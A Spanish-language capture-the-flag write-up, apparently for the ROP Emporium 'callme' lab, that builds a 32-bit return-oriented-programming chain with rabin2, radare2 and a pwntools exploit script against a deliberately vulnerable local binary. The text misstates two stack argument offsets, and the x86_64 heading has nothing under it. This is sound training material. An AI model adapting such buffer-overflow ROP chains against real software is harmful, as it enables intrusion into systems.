# callme

## x86

```
 checksec --file=callme32
[*] '/home/kalcast/Descargas/callme32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No
```

Ok de nuevo sin canario ni PIE, en la descripcion nos dicen que para ganra debemos llamar a tres funciones: `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, ` callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` y `callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

Los argumentos de una funcion en x86 se pasan por el stack. Cuando se hace un "call fun" el stack frame luce asi:
```
 function_return      <-- esp
 reserved_ebp         <-- ebp
 arg1 
 arg2
 arg3
```

La funcion busca el primer argumento en ebp+0x8, el segundo en ebp+0x10 y el tercero en ebp+0x18 y luego retorna a "function_return".

Luego limpia el stack frame moviendo esp con `add esp,12` por ejemplo.

Necesitamos simular este comportamiento para tres llamadas. Podemos obtenerlas con rabin2:
```
 rabin2 -s callme32  | grep callme
35  ---------- 0x00000000 LOCAL  FILE   0        callme.c
3   0x000004e0 0x080484e0 GLOBAL FUNC   16       imp.callme_three
4   0x000004f0 0x080484f0 GLOBAL FUNC   16       imp.callme_one
11  0x00000550 0x08048550 GLOBAL FUNC   16       imp.callme_two
```

Es curioso notar que estas funciones no pertenecen al binario sino que son importadas desde `libcallme32.so`

```
rabin2 -R callme32 | grep callme
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
0x0804a014 0x00001014 SET_32 7     callme_three
0x0804a018 0x00001018 SET_32 7     callme_one
0x0804a030 0x00001030 SET_32 7     callme_two
```

Tenemos las direcciones de las funciones y conocemos los argumentos pero debemos limpiar la pila entre llamadas.

Podemos usar un "gadget", un grupo de instrucciones en ensamblador que hacen algo y terminan en `ret`.

Necesitamos una que haga tres `pop` para eliminar los argumentos y limpiar la pila. Podemos dentro de r2 usar "/R" para obtener un gadget:
``` /R pop
...
  0x080487f8                 5b  pop ebx
  0x080487f9                 5e  pop esi
  0x080487fa                 5f  pop edi
  0x080487fb                 5d  pop ebp
  0x080487fc                 c3  ret
...
```

Podemos usar esta direccion: 0x080487f9.

Exploit con Python/pwntools:
``` python
from pwn import *
elf = context.binary = ELF("./callme32")
io = process("./callme32")

pop_gadget=0x080487f9
def call(addr):
    payload=p32(addr)
    payload+=p32(pop_gadget) 
    #payload+=p32(0x0)
    payload+=p32(0xdeadbeef) # ebp + 8
    payload+=p32(0xcafebabe)
    payload+=p32(0xd00df00d)
    return payload

io.recv()
payload=b"A"*44
payload+=call(elf.sym['callme_one'])
payload+=call(elf.sym['callme_two'])
payload+=call(elf.sym['callme_three'])

io.sendline(payload)
io.interactive()
```

## x86_64







